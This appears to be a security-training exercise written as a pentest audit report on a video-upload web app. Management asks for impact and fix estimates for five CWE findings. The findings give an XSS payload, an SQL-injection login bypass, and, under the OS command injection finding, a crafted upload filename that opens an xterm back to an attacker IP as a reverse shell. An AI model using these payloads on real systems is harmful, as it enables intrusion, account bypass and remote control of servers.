# Security Audit

## Background
We hired a super leet pentest firm.  We gave them a copy of some of our older source code and the results just came back and...its not good.

## Challenge

Management wants a report ASAP that covers three things for each security issue found during the audit.

1. An assessment if the current code is also vulnerable
2. The impact to the business if exploited
3. Time estimate in hours to fix the issue

## Issues

### CWE-330: Use of Insufficiently Random Values
The login session is deterministically generated directly from the username.  The session should be a randomly generated value such that the attacker cannot predict its value.  If the attacker can predict this value, the login mechanism can be bypassed.

### CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
Viewing videos can be used to load stored and reflected cross site scripting attacks.  This can be used for social engineering attacks as well as a host of other XSS related attacks.

To reproduce enter `<script>alert(42);</script>` in a stored video field such as the name or the description.  Reloading the page executes and displays the alert box.  A URL encoded script can also reflected through the GET "video" parameter.

### CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

SQL injection can be used to bypass the login page with `' OR 1==1;#`.  SQL could be used to violate the integrity of the database or gain access to the database host.

### CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

It is possible to run arbitrary shell commands by crafting the filename of the mp4, ogg, or webm file to be uploaded.  This attack is easier to execute from *nix based file systems which allow a greater range of characters in filenames.  The following instructions demonstrate how a reverse shell could be constructed using the command injection vulnerability.

Run `sudo apt-get install xnest`
Run `Xnest :1`
Run `xhost +targetip`

Go to `/post.php` and enter values for all fields and browse to a specially crafted file upload.

File upload must be a valid mp4 video.  To get a valid mp4 find a youtube video (suggest [https://www.youtube.com/watch?v=1ZHb8983wMU](https://www.youtube.com/watch?v=1ZHb8983wMU)) and enter the video url on [http://www.clipconverter.cc/](http://www.clipconverter.cc/).  Select MP4 and download file.

Rename the downloaded MP4 file to `";xterm -display 10.0.0.1:1;".mp4`.  Change `10.0.0.1` to the IP address of the attacker machine to connect back to.  Upload the crafted file and wait for pwnage.

Reference: [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### CWE-434: Unrestricted Upload of File with Dangerous Type

After uploading a file that is not mp4, ogg, or webm the file is left in the upload directory.  The upload directory is executable and an attacker could simply upload a PHP shell and then navigate to where the shell was uploaded through a browser to execute the code.